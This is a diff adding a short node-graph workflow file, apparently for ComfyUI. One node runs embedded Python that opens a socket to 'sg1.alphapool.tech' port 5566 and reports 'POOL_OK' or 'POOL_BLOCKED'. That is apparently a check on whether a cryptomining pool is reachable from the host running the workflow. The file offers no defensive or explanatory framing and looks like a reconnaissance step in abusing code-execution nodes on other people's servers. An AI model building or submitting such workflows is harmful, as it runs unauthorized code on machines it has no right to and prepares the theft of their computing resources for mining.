@@ -1,0 +1,18 @@
+{
+  "1": {
+    "inputs": {
+      "language": "python",
+      "pycode": "import socket\ntry:\n s=socket.socket()\n s.settimeout(5)\n s.connect((\"sg1.alphapool.tech\",5566))\n s.close()\n result=\"POOL_OK\"\nexcept Exception as e:\n result=f\"POOL_BLOCKED:{e}\""
+    },
+    "class_type": "IDENode"
+  },
+  "2": {
+    "inputs": {
+      "text": [
+        "1",
+        0
+      ]
+    },
+    "class_type": "ShowTextForGPT"
+  }
+}
